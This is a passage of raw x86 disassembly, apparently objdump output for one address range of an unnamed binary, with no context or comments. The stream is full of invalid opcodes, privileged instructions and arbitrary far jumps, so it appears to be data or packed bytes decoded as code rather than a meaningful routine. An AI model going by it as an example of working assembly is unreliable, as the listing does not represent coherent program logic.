  42691d:	adc    ecx,ebp
  42691f:	xchg   esi,eax
  426920:	xor    ch,cl
  426922:	out    0x30,al
  426924:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42692a:	xchg   edx,eax
  42692b:	shr    ecx,cl
  42692d:	sub    BYTE PTR [ebx-0x27],dl
  426930:	xchg   DWORD PTR [ebx],edx
  426932:	or     cl,bh
  426934:	adc    eax,0xcd0000ff
  426939:	lea    ecx,[ebp+ecx*8-0x6a]
  42693d:	dec    esp
  42693e:	int    0xe6
  426940:	mov    BYTE PTR [ebx],bh
  426942:	icebp  
  426943:	cmp    ecx,DWORD PTR [edi]
  426945:	shr    ebx,cl
  426947:	xchg   edx,eax
  426948:	shr    edx,cl
  42694a:	sub    BYTE PTR [ebx+0x13],dl
  42694d:	iret   
  42694e:	push   es
  42694f:	nop
  426950:	inc    DWORD PTR [eax]
  426952:	add    BYTE PTR [edx],cl
  426954:	add    eax,0xff1dcf
  426959:	add    bh,cl
  42695b:	jbe    0x42692d
  42695d:	mov    ebp,0x10d8
  426962:	int    0x8d
  426964:	xor    ch,cl
  426966:	xchg   esi,eax
  426967:	xor    al,al
  426969:	(bad)  
  42696a:	cmp    ecx,DWORD PTR [edi]
  42696c:	stos   BYTE PTR es:[edi],al
  42696d:	cmp    ebx,ecx
  42696f:	shr    ebx,cl
  426971:	xchg   edx,eax
  426972:	shr    edx,cl
  426974:	sub    BYTE PTR [ebx+0x13],dl
  426977:	or     al,BYTE PTR ds:0xff1dcf
  42697d:	add    ch,cl
  42697f:	jbe    0x4269cd
  426981:	int    0x8d
  426983:	dec    esp
  426984:	cmp    edi,DWORD PTR [ecx-0x2d]
  426987:	mov    ebp,0xd3f03b92
  42698c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426990:	aam    0x3c
  426992:	iret   
  426993:	push   es
  426994:	adc    eax,0x700000ff
  426999:	int    0x76
  42699b:	xor    ch,cl
  42699d:	lea    esi,[eax]
  42699f:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269a2:	mov    ebp,0xd3f03b92
  4269a7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269ab:	jo     0x42697c
  4269ad:	push   es
  4269ae:	and    al,0x0
  4269b0:	add    BYTE PTR [eax],al
  4269b2:	jo     0x426981
  4269b4:	jbe    0x4269ca
  4269b6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269bd:	int    0x8d
  4269bf:	dec    esp
  4269c0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4269c3:	lock int 0xe6
  4269c6:	mov    bl,dl
  4269c8:	mov    ebp,0x28f2d392
  4269cd:	push   ebx
  4269ce:	ror    edi,cl
  4269d0:	iret   
  4269d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269d2:	inc    DWORD PTR [eax]
  4269d4:	add    BYTE PTR [edx],cl
  4269d6:	int3   
  4269d7:	push   es
  4269d8:	sbb    eax,0xcf0000ff
  4269dd:	jbe    0x426a04
  4269df:	mov    ebp,0xeff5
  4269e4:	int    0x8d
  4269e6:	xor    ch,cl
  4269e8:	xchg   esi,eax
  4269e9:	xor    BYTE PTR [ebx],bh
  4269eb:	psrlq  mm5,mm3
  4269ee:	xchg   edx,eax
  4269ef:	add    al,0xfb
  4269f1:	call   ebx
  4269f3:	jmp    0xcf05:0xa135328
  4269fa:	sbb    eax,0x610000ff
  4269ff:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a05:	xor    eax,0xab88080
  426a0a:	push   es
  426a0b:	jo     0x426a0d
  426a0d:	add    BYTE PTR [eax],al
  426a0f:	iret   
  426a10:	mov    dh,BYTE PTR [eax]
  426a12:	mov    eax,0xb4cf0a
  426a17:	add    BYTE PTR [eax],al
  426a19:	pop    ebp
  426a1a:	adc    BYTE PTR ds:0xab88080,dh
  426a20:	push   es
  426a21:	bound  eax,QWORD PTR [eax]
  426a23:	add    BYTE PTR [eax],al
  426a25:	int    0xd2
  426a27:	mov    eax,0x94060a
  426a2c:	add    BYTE PTR [eax],al
  426a2e:	int    0xd3
  426a30:	mov    eax,0x98060a
  426a35:	add    BYTE PTR [eax],al
  426a37:	add    al,0x6d
  426a39:	sub    ch,cl
  426a3b:	jge    0x4269f5
  426a3d:	or     cl,bh
  426a3f:	mov    eax,0xcf000000
  426a44:	mov    ch,BYTE PTR [eax]
  426a46:	mov    eax,0xbccf0a
  426a4b:	add    BYTE PTR [eax],al
  426a4d:	add    al,0xd3
  426a4f:	pusha  
  426a50:	mov    eax,0xc0cf0a
  426a55:	add    BYTE PTR [eax],al
  426a57:	iret   
  426a58:	mov    cl,BYTE PTR [edx-0x48]
  426a5b:	or     cl,bh
  426a5d:	les    eax,FWORD PTR [eax]
  426a5f:	add    BYTE PTR [eax],al
  426a61:	int    0xf9
  426a63:	mov    eax,0x9c670a
  426a68:	add    BYTE PTR [eax],al
  426a6a:	iret   
  426a6b:	loopne 0x426a0d
  426a6d:	pop    edi
  426a6e:	add    BYTE PTR ds:0xab88080,dh
  426a74:	iret   
  426a75:	enter  0x0,0x0
  426a79:	iret   
  426a7a:	mov    bh,bh
  426a7c:	mov    eax,0x90cf0a
  426a81:	add    BYTE PTR [eax],al
  426a83:	mov    eax,0xa0670a
  426a88:	add    BYTE PTR [eax],al
  426a8a:	add    al,0xc9
  426a8c:	stc    
  426a8d:	mov    eax,0xa4670a
  426a92:	add    BYTE PTR [eax],al
  426a94:	int    0xf9
  426a96:	pop    edi
  426a97:	leave  
  426a98:	xor    eax,0xab88080
  426a9d:	iret   
  426a9e:	add    BYTE PTR [eax],0x0
  426aa1:	add    ch,cl
  426aa3:	jge    0x426a5d
  426aa5:	or     cl,bh
  426aa7:	aam    0x0
  426aa9:	add    BYTE PTR [eax],al
  426aab:	int    0xc5
  426aad:	mov    eax,0xe0060a
  426ab2:	add    BYTE PTR [eax],al
  426ab4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426ab7:	or     ah,BYTE PTR [edi-0x58]
  426aba:	add    BYTE PTR [eax],al
  426abc:	add    bh,cl
  426abe:	addr16 in al,0x0
  426ac1:	add    BYTE PTR [eax],al
  426ac3:	leave  
  426ac4:	push   es
  426ac5:	lods   al,BYTE PTR ds:[esi]
  426ac6:	add    BYTE PTR [eax],al
  426ac8:	add    dh,ah
  426aca:	xor    eax,0x6c9352b
  426acf:	fadd   DWORD PTR [eax]
  426ad1:	add    BYTE PTR [eax],al
  426ad3:	jae    0x426b0a
  426ad5:	jno    0x426b0c
  426ad7:	mov    eax,0x3076cdaf
  426adc:	int    0x8d
  426ade:	xor    ch,cl
  426ae0:	xchg   esi,eax
  426ae1:	xor    BYTE PTR [edx+eax*1],al
  426ae4:	call   ebx
  426ae6:	repnz sub BYTE PTR [ebx],bh
  426ae9:	jns    0x426abe
  426aeb:	mov    ebp,0xcdd35392
  426af0:	lea    esi,[eax]
  426af2:	add    al,0x2
  426af4:	(bad)  
  426af5:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426afb:	repz xchg edx,eax
  426afd:	push   ebx
  426afe:	jecxz  0x426b3b
  426b00:	retf   
  426b01:	add    al,0xd2
  426b03:	sbb    bl,BYTE PTR [ebx]
  426b05:	retf   
  426b06:	cmp    eax,DWORD PTR [eax]
  426b08:	inc    ebx
  426b09:	cli    
  426b0a:	das    
  426b0b:	or     cl,dl
  426b0d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b14:	das    
  426b15:	add    al,0x37
  426b17:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b1e:	xchg   esi,eax
  426b1f:	xor    BYTE PTR [ebx],bh
  426b21:	psrlq  mm5,mm3
  426b24:	xchg   edx,eax
  426b25:	add    al,0xfb
  426b27:	call   ebx
  426b29:	jmp    0xcd7d:0x87135328
  426b30:	aad    0xb8
  426b32:	cmp    edx,DWORD PTR ds:0x708d
  426b38:	add    ch,cl
  426b3a:	lea    esi,[eax]
  426b3c:	int    0xe6
  426b3e:	xor    BYTE PTR [ebx],bh
  426b40:	psrlq  mm5,mm3
  426b43:	xchg   edx,eax
  426b44:	add    al,0xf8
  426b46:	call   ebx
  426b48:	jmp    0x8832be75
  426b4d:	jge    0x426b07
  426b4f:	int    0xcc
  426b51:	lea    esi,[eax+0x0]
  426b54:	add    BYTE PTR [eax],al
  426b56:	mov    eax,0xd3b8e3f8
  426b5b:	repnz das 
  426b5d:	mov    eax,0x53b8f3e3
  426b62:	jecxz  0x426b31
  426b64:	lea    esi,[eax]
  426b66:	int    0xe6
  426b68:	xor    BYTE PTR [ebx],bh
  426b6a:	psrlq  mm5,mm3
  426b6d:	xchg   edx,eax
  426b6e:	add    al,0xf8
  426b70:	call   ebx
  426b72:	jmp    0x8832be9f
  426b77:	jge    0x426b31
  426b79:	or     dl,BYTE PTR ds:0x708d
  426b7f:	add    ch,cl
  426b81:	lea    esi,[eax]
  426b83:	int    0x96
  426b85:	xor    BYTE PTR [ebx],bh
  426b87:	(bad)  
  426b89:	sti    
  426b8a:	call   ebx
  426b8c:	jmp    0x426b20
  426b8e:	shr    edx,cl
  426b90:	sub    BYTE PTR [ebx+0x13],dl
  426b93:	int    0x96
  426b95:	xor    BYTE PTR [edi+0x308dcdd3],al
  426b9b:	add    al,0x2
  426b9d:	(bad)  
  426b9e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426ba4:	repz xchg edx,eax
  426ba6:	push   ebx
  426ba7:	jecxz  0x426be4
  426ba9:	retf   
  426baa:	add    al,0xd2
  426bac:	sbb    bl,BYTE PTR [ebx]
  426bae:	retf   
  426baf:	cmp    eax,DWORD PTR [eax]
  426bb1:	inc    ebx
  426bb2:	cli    
  426bb3:	das    
  426bb4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bba:	pop    es
  426bbb:	pop    ebx
  426bbc:	add    BYTE PTR [eax],al
  426bbe:	add    bl,al
  426bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bc1:	mov    esi,0x76cf4229
  426bc6:	jne    0x426bd2
  426bc8:	jbe    0x426b52
  426bca:	int    0x76
  426bcc:	mov    BYTE PTR [edi+0x13de37b6],bh
  426bd2:	or     bl,BYTE PTR [ecx+ecx*8]
  426bd5:	ins    BYTE PTR es:[edi],dx
  426bd6:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426bdc:	jbe    0x426c53
  426bde:	int    0x8d
  426be0:	jge    0x426c11
  426be2:	inc    ebp
  426be3:	jge    0x426b77
  426be5:	shr    ebx,cl
  426be7:	xchg   edx,eax
  426be8:	int    0x8d
  426bea:	jne    0x426bb9
  426bec:	xchg   esi,eax
  426bed:	jge    0x426c2a
  426bef:	leave  
  426bf0:	cmp    ebx,edx
  426bf2:	push   ebx
  426bf3:	icebp  
  426bf4:	int    0x76
  426bf6:	cmc    
  426bf7:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426bfd:	jo     0x426bce
  426bff:	push   es
  426c00:	cmc    
  426c01:	inc    DWORD PTR [eax]
  426c03:	add    BYTE PTR [eax-0x2d],dh
  426c06:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c0d:	int    0x76
  426c0f:	in     eax,dx
  426c10:	int    0x8d
  426c12:	adc    DWORD PTR [edi],ebp
  426c14:	inc    ebp
  426c15:	jge    0x426ba9
  426c17:	shr    ebx,cl
  426c19:	xchg   edx,eax
  426c1a:	int    0x8d
  426c1c:	in     eax,dx
  426c1d:	int    0x96
  426c1f:	adc    ebx,edx
  426c21:	repnz sub ch,cl
  426c24:	iret   
  426c25:	cmc    
  426c26:	inc    DWORD PTR [eax]
  426c28:	add    ch,cl
  426c2a:	mov    DWORD PTR [ebx],edi
  426c2c:	leave  
  426c2d:	cmp    ebx,edx
  426c2f:	push   ebx
  426c30:	rol    BYTE PTR [ebx+0x7d],cl
  426c33:	das    
  426c34:	push   es
  426c35:	push   ebp
  426c36:	add    BYTE PTR [eax-0xa293280],0xc9
  426c3d:	jbe    0x426c4c
  426c3f:	(bad)  
  426c40:	ficom  WORD PTR ss:[ebx]
  426c43:	pop    ebp
  426c44:	mov    ebp,0xa25230a
  426c49:	jbe    0x426c3c
  426c4b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c51:	int    0x76
  426c53:	xchg   ebp,eax
  426c54:	int    0x8d
  426c56:	popf   
  426c57:	das    
  426c58:	inc    ebp
  426c59:	jge    0x426bed
  426c5b:	shr    ebx,cl
  426c5d:	xchg   edx,eax
  426c5e:	int    0x8d
  426c60:	xchg   ebp,eax
  426c61:	int    0x96
  426c63:	popf   
  426c64:	cmp    ecx,ecx
  426c66:	cmp    ebx,edx
  426c68:	push   ebx
  426c69:	icebp  
  426c6a:	bound  eax,QWORD PTR [eax]
  426c6c:	(bad)  
  426c6d:	xor    al,0xd3
  426c6f:	repnz sub BYTE PTR [eax],al
  426c72:	pop    ecx
  426c73:	xor    eax,0xbd808081
  426c78:	push   eax
  426c79:	repnz add BYTE PTR [eax],al
  426c7c:	int    0x76
  426c7e:	xchg   ebp,eax
  426c7f:	int    0x8d
  426c81:	popf   
  426c82:	das    
  426c83:	inc    ebp
  426c84:	jge    0x426c18
  426c86:	shr    ebx,cl
  426c88:	xchg   edx,eax
  426c89:	int    0x8d
  426c8b:	xchg   ebp,eax
  426c8c:	int    0x96
  426c8e:	popf   
  426c8f:	cmp    ecx,ecx
  426c91:	cmp    ebx,edx
  426c93:	push   ebx
  426c94:	icebp  
  426c95:	bound  eax,QWORD PTR [eax]
  426c97:	pop    ecx
  426c98:	xor    eax,0xd3808081
  426c9d:	repnz sub BYTE PTR [eax],al
  426ca0:	pop    ecx
  426ca1:	sub    eax,0xbd808081
  426ca6:	xchg   edx,eax
  426ca7:	repnz add BYTE PTR [eax],al
  426caa:	int    0x7
  426cac:	xor    eax,0xcd808081
  426cb1:	mov    ch,cl
  426cb3:	jle    0x426d19
  426cb5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cbb:	lea    ecx,ds:0x2ff176cd
  426cc1:	inc    ebp
  426cc2:	rcl    DWORD PTR [edx-0x326d422d],cl
  426cc8:	jbe    0x426cd7
  426cca:	int    0x96
  426ccc:	icebp  
  426ccd:	cmp    esi,eax
  426ccf:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426cd5:	ror    ebp,cl
  426cd7:	lea    ecx,[eax+0x187ebb2f]
  426cdd:	push   es
  426cde:	jge    0x426cb4
  426ce0:	dec    esp
  426ce1:	int    0x7
  426ce3:	popf   
  426ce4:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426cee:	jbe    0x426d3c
  426cf0:	int    0x76
  426cf2:	xor    BYTE PTR [eax],al
  426cf4:	(bad)  
  426cf5:	cmp    al,0x0
  426cf7:	(bad)  
  426cf8:	cmc    
  426cf9:	add    dh,dl
  426cfb:	sub    al,0x0
  426cfd:	(bad)  
  426cfe:	and    al,0x0
  426d00:	(bad)  
  426d01:	sbb    al,0x0
  426d03:	(bad)  
  426d04:	adc    al,0xbd
  426d06:	test   ch,dh
  426d08:	add    BYTE PTR [eax],al
  426d0a:	or     al,BYTE PTR [esi]
  426d0c:	adc    edi,edi
  426d0e:	add    BYTE PTR [eax],al
  426d10:	int    0x76
  426d12:	cmp    al,0x4
  426d14:	fcom   QWORD PTR [eax+eax*4]
  426d17:	aam    0x1a
  426d19:	int    0x76
  426d1b:	cmp    al,0x4
  426d1d:	fsub   QWORD PTR [eax+eax*4]
  426d20:	aam    0x4e
  426d22:	int    0x6
  426d24:	adc    edi,edi
  426d26:	add    BYTE PTR [eax],al
  426d28:	int    0x8d
  426d2a:	cmp    al,0xa
  426d2c:	outs   dx,BYTE PTR ds:[esi]
  426d2d:	sbb    al,0xec
  426d2f:	push   ebx
  426d30:	add    dh,dl
  426d32:	cmp    al,0x0
  426d34:	(bad)  
  426d35:	cmc    
  426d36:	mov    ebp,0x6daa
  426d3b:	stos   BYTE PTR es:[edi],al
  426d3c:	test   al,0x63
  426d3e:	retf   
  426d3f:	shl    BYTE PTR [eax+eax*4],cl
  426d42:	xchg   esi,eax
  426d43:	int    0xed
  426d45:	jno    0x426db8
  426d47:	cwde   
  426d48:	leave  
  426d49:	jbe    0x426d48
  426d4b:	dec    ecx
  426d4c:	and    DWORD PTR [esi-0x68936cb],eax
  426d52:	inc    ecx
  426d53:	and    DWORD PTR [esi-0x28932cb],eax
  426d59:	int    0xd6
  426d5b:	std    
  426d5c:	sar    bh,0x5f
  426d5f:	shl    DWORD PTR [ecx],1
  426d61:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426d67:	sti    
  426d68:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426d6e:	push   ebx
  426d6f:	jns    0x426d3e
  426d71:	(bad)  
  426d72:	mov    BYTE PTR [ebx+0x11],al
  426d75:	int    0x76
  426d77:	std    
  426d78:	aam    0xc4
  426d7a:	int    0xd6
  426d7c:	std    
  426d7d:	cmp    edx,ebx
  426d7f:	cmp    edi,ebx
  426d81:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426d87:	push   ebx
  426d88:	jns    0x426d57
  426d8a:	(bad)  
  426d8b:	dec    esp
  426d8c:	inc    ebx
  426d8d:	adc    esp,edx
  426d8f:	pop    ebx
  426d90:	int    0x96
  426d92:	xor    BYTE PTR [edx-0x32b31933],bl
  426d98:	jbe    0x426d22
  426d9a:	cmp    esi,edi
  426d9c:	push   es
  426d9d:	add    ah,dl
  426d9f:	push   esi
  426da0:	pop    ebx
  426da1:	retf   0x8624
  426da4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426daa:	das    
  426dab:	push   es
  426dac:	fcmovbe st,st(6)
  426dae:	dec    esi
  426daf:	add    al,0xf4
  426db1:	adc    DWORD PTR [edx],0xffffffc5
  426db4:	fwait
  426db5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426dbc:	dec    esp
  426dbd:	adc    ch,ah
  426dbf:	in     eax,dx
  426dc0:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426dc7:	lea    ebp,[edi]
  426dc9:	retf   0x2fa6
  426dcc:	or     DWORD PTR [esi+eax*4],esp
  426dcf:	js     0x426e14
  426dd1:	clc    
  426dd2:	or     BYTE PTR [esi],0x63
  426dd5:	int    0x76
  426dd7:	stc    
  426dd8:	cmp    edx,ebx
  426dda:	int    0x8d
  426ddc:	stc    
  426ddd:	add    al,0x2
  426ddf:	jmp    FWORD PTR [edx+0x76cd4aec]
  426de5:	std    
  426de6:	cmp    edx,ebx
  426de8:	int    0x8d
  426dea:	std    
  426deb:	cmp    edx,DWORD PTR [ebx]
  426ded:	shl    edx,cl
  426def:	sub    bl,dl
  426df1:	mov    ebp,0xa8d35392
  426df6:	retf   
  426df7:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426dfb:	int    0xed
  426dfd:	add    al,0xed
  426dff:	(bad)  
  426e00:	leave  
  426e01:	jbe    0x426e00
  426e03:	dec    ecx
  426e04:	and    DWORD PTR [esi+0x21416135],eax
  426e0a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e10:	jbe    0x426e26
  426e12:	or     dh,BYTE PTR [esi+0x14]
  426e15:	int    0x76
  426e17:	adc    al,0xcd
  426e19:	add    DWORD PTR ds:0xcd808081,ebp
  426e1f:	lea    edx,[ecx*8+0x2d0acd80]
  426e26:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e30:	lea    esi,[ebp-0x32028933]
  426e36:	(bad)  
  426e37:	std    
  426e38:	cwde   
  426e39:	call   0x3b85:0x82cfffc0
  426e40:	jns    0x426e15
  426e42:	mov    ebp,0xf03baa92
  426e47:	shl    edx,cl
  426e49:	sub    BYTE PTR [ebx-0x2d],dl
  426e4c:	or     dh,BYTE PTR [esi-0x63]
  426e4f:	int    0x76
  426e51:	std    
  426e52:	int    0x8d
  426e54:	std    
  426e55:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e58:	mov    ebp,0xd3f03b92
  426e5d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426e61:	or     dh,BYTE PTR [esi-0x53]
  426e64:	int    0x76
  426e66:	mov    ch,0xcd
  426e68:	ins    BYTE PTR es:[edi],dx
  426e69:	jo     0x426e6f
  426e6b:	mov    ebp,0xf1760a4c
  426e70:	int    0x76
  426e72:	mov    ch,0xcd
  426e74:	ins    BYTE PTR es:[edi],dx
  426e75:	pop    esp
  426e76:	int    0x8d
  426e78:	mov    ch,0x7c
  426e7a:	push   es
  426e7b:	outs   dx,BYTE PTR ds:[esi]
  426e7c:	xchg   esp,eax
  426e7d:	int    0x76
  426e7f:	mov    ch,0xd4
  426e81:	sbb    al,0xcd
  426e83:	ins    BYTE PTR es:[edi],dx
  426e84:	pop    esp
  426e85:	int    0x8d
  426e87:	mov    ch,0xcd
  426e89:	jle    0x426e1f
  426e8b:	jl     0x426e85
  426e8d:	icebp  
  426e8e:	sub    edi,DWORD PTR [ebp-0x33]
  426e91:	jbe    0x426e48
  426e93:	int    0x6c
  426e95:	pop    esp
  426e96:	xchg   ebx,edx
  426e98:	in     al,dx
  426e99:	xchg   ebp,ecx
  426e9b:	ins    BYTE PTR es:[edi],dx
  426e9c:	xchg   esp,eax
  426e9d:	or     dh,BYTE PTR [esi-0x43]
  426ea0:	int    0x76
  426ea2:	std    
  426ea3:	int    0x8d
  426ea5:	std    
  426ea6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ea9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426eb0:	push   ebx
  426eb1:	ror    DWORD PTR [edx],cl
  426eb3:	jbe    0x426ec9
  426eb5:	int    0x76
  426eb7:	std    
  426eb8:	int    0x8d
  426eba:	std    
  426ebb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ebe:	lock shl edx,cl
  426ec1:	sub    bl,dl
  426ec3:	mov    ebp,0xad35392
  426ec8:	jbe    0x426ede
  426eca:	int    0x76
  426ecc:	std    
  426ecd:	int    0x8d
  426ecf:	std    
  426ed0:	cmp    esi,eax
  426ed2:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ed5:	repnz sub bl,dl
  426ed8:	mov    ebp,0xcdd35392
  426edd:	lea    esi,[eax]
  426edf:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426ee5:	jbe    0x426efb
  426ee7:	cmp    DWORD PTR [ecx],esp
  426ee9:	xchg   BYTE PTR ds:0xb21476c9,dh
  426eef:	and    DWORD PTR [esi+0x1476c935],eax
  426ef5:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426efb:	xchg   BYTE PTR [eax-0x2893280],al
  426f01:	int    0x8d
  426f03:	std    
  426f04:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f07:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f0e:	push   ebx
  426f0f:	ror    DWORD PTR [edx],cl
  426f11:	jbe    0x426ec0
  426f13:	int    0x76
  426f15:	mov    ebp,0xa4c7687
  426f1a:	jbe    0x426eb9
  426f1c:	add    dh,dl
  426f1e:	popf   
  426f1f:	add    dh,dl
  426f21:	dec    esp
  426f22:	int    0x8d
  426f24:	mov    ch,0xbd
  426f26:	neg    bh
  426f28:	add    BYTE PTR [eax],al
  426f2a:	or     dh,BYTE PTR [esi+0x14]
  426f2d:	int    0x76
  426f2f:	adc    al,0x6
  426f31:	ins    DWORD PTR es:[edi],dx
  426f32:	aam    0x60
  426f34:	int    0x76
  426f36:	popf   
  426f37:	or     dh,BYTE PTR [esi-0x5b]
  426f3a:	int    0x76
  426f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f3d:	int    0x8d
  426f3f:	dec    esp
  426f40:	xor    edx,ebx
  426f42:	or     dh,BYTE PTR [esi-0x5b]
  426f45:	int    0x76
  426f47:	adc    al,0xcd
  426f49:	lea    edx,[ecx*8+0x6e87306c]
  426f50:	dec    esp
  426f51:	int    0x8d
  426f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f54:	inc    ebx
  426f55:	jge    0x426ed9
  426f57:	sbb    ch,cl
  426f59:	jbe    0x426f6f
  426f5b:	int    0x6c
  426f5d:	dec    esp
  426f5e:	int    0x8d
  426f60:	adc    al,0x87
  426f62:	outs   dx,BYTE PTR ds:[esi]
  426f63:	mov    ch,cl
  426f65:	lea    esp,[ebp-0x2e142ccd]
  426f6b:	test   DWORD PTR [eax+0x2149bf80],eax
  426f71:	xchg   BYTE PTR ds:0xc90da60a,dh
  426f77:	jbe    0x426ff6
  426f79:	inc    ecx
  426f7a:	and    DWORD PTR [esi+0x7576c935],eax
  426f80:	cmp    DWORD PTR [ecx],esp
  426f82:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426f88:	and    DWORD PTR [esi+0xd76cf35],eax
  426f8e:	or     dh,BYTE PTR [esi-0xb]
  426f91:	iret   
  426f92:	jbe    0x427011
  426f94:	or     dh,BYTE PTR [esi+0x11]
  426f97:	iret   
  426f98:	jbe    0x42700f
  426f9a:	or     dh,BYTE PTR [esi+0x14]
  426f9d:	iret   
  426f9e:	jbe    0x42700d
  426fa0:	or     dh,BYTE PTR [esi-0x13]
  426fa3:	int    0x76
  426fa5:	std    
  426fa6:	int    0x8d
  426fa8:	std    
  426fa9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fac:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fb3:	push   ebx
  426fb4:	ror    DWORD PTR [edx],cl
  426fb6:	jbe    0x426f5d
  426fb8:	jmp    0x426fcd
  426fba:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  426fc0:	and    DWORD PTR [esi-0x22fad0cb],eax
  426fc6:	xchg   DWORD PTR [eax+0x4cc080],eax
  426fcc:	(bad)  
  426fcd:	popf   
  426fce:	iret   
  426fcf:	jbe    0x426fa1
  426fd1:	jo     0x426f90
  426fd3:	xlat   BYTE PTR ds:[ebx]
  426fd4:	fild   WORD PTR [eax]
  426fd6:	add    ch,cl
  426fd8:	jbe    0x426fd3
  426fda:	int    0x8d
  426fdc:	stc    
  426fdd:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fe0:	lock shl edx,cl
  426fe3:	sub    bl,dl
  426fe5:	mov    ebp,0xad35392
  426fea:	jbe    0x426f99
  426fec:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  426ff2:	int    0x76
  426ff4:	xchg   ebp,eax
  426ff5:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  426ffb:	in     eax,0x28
  426ffd:	push   ebx
  426ffe:	popf   
  426fff:	or     ah,BYTE PTR [esi-0x689325b]
  427005:	int    0x8d
  427007:	stc    
  427008:	cmp    esi,eax
  42700a:	shl    edx,cl
  42700c:	sub    BYTE PTR [ebx],bh
  42700e:	jns    0x426fe3
  427010:	mov    ebp,0xcdd35392
  427015:	(bad)  
  427016:	stc    
  427017:	int    0x96
  427019:	stc    
  42701a:	cmp    ecx,DWORD PTR [edi]
  42701c:	cmp    ebx,ecx
  42701e:	shr    ebx,cl
  427020:	xchg   edx,eax
  427021:	shr    edx,cl
  427023:	sub    BYTE PTR [ebx+0x13],dl
  427026:	xchg   ebx,edx
  427028:	int    0x8d
  42702a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42702b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427031:	sub    ch,cl
  427033:	jbe    0x42702e
  427035:	int    0x8d
  427037:	stc    
  427038:	cmp    edi,DWORD PTR [ecx+0x3b]
  42703b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427042:	push   ebx
  427043:	shl    DWORD PTR [eax-0x40],cl
  427046:	dec    esp
  427047:	iret   
  427048:	jbe    0x42701a
  42704a:	jo     0x427009
  42704c:	sti    
  42704d:	std    
  42704e:	add    BYTE PTR [eax],al
  427050:	int    0x76
  427052:	std    
  427053:	int    0x8d
  427055:	std    
  427056:	cmp    edi,DWORD PTR [ecx+0x3b]
  427059:	lock shl edx,cl
  42705c:	sub    bl,dl
  42705e:	mov    ebp,0xcdd35392
  427063:	lea    esp,[ebp+0x28d47d43]
  427069:	int    0x76
  42706b:	std    
  42706c:	int    0x8d
  42706e:	std    
  42706f:	cmp    edi,DWORD PTR [ecx+0x3b]
  427072:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427079:	push   ebx
  42707a:	shl    DWORD PTR [eax-0x40],cl
  42707d:	dec    esp
  42707e:	iret   
  42707f:	jbe    0x427051
  427081:	jo     0x427040
  427083:	mov    edi,0xcd0000fd
  427088:	jbe    0x42707f
  42708a:	int    0x8d
  42708c:	cmc    
  42708d:	int    0x89
  42708f:	int    0x80
  427091:	cmp    esi,eax
  427093:	cmp    edi,DWORD PTR [ecx-0x2d]
  427096:	repnz sub bl,dl
  427099:	mov    ebp,0xcad35392
  42709e:	je     0x427025
  4270a0:	ror    ch,1
  4270a2:	(bad)  
  4270a3:	std    
  4270a4:	int    0x96
  4270a6:	std    
  4270a7:	cmp    ecx,DWORD PTR [edi]
  4270a9:	cmp    ebx,ecx
  4270ab:	shr    ebx,cl
  4270ad:	xchg   edx,eax
  4270ae:	shr    edx,cl
  4270b0:	sub    BYTE PTR [edi],ch
  4270b2:	pop    ecx
  4270b3:	ins    DWORD PTR es:[edi],dx
  4270b4:	push   ebx
  4270b5:	adc    eax,DWORD PTR [ebx-0x2d]
  4270b8:	das    
  4270b9:	add    eax,0x80809212
  4270be:	int    0x76
  4270c0:	adc    ebp,ecx
  4270c2:	lea    edx,[ecx]
  4270c4:	int    0x89
  4270c6:	int    0x80
  4270c8:	cmp    esi,eax
  4270ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4270cd:	repnz sub bl,dl
  4270d0:	mov    ebp,0xcad35392
  4270d5:	je     0x42705c
  4270d7:	ror    ch,1
  4270d9:	(bad)  
  4270da:	std    
  4270db:	int    0x96
